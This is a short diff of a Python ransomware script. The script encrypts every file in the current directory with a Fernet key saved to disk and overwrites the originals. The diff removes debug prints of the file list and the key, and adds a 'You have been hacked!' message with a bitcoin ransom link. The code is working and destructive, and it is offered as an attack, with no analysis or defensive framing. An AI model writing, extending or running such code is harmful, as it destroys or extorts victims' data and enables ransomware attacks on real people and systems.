@@ -9,10 +9,8 @@ for file in os.listdir():
     # append those files that u stored in for loop to Array called files
     if os.path.isfile(file):
         files.append(file)
-print(files)
 
 key = Fernet.generate_key()
-print(key)
 
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
@@ -23,3 +21,4 @@ for file in files:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
+print("You have been hacked! bitcoin link: https://bit.bit1231asdSADJH.com")
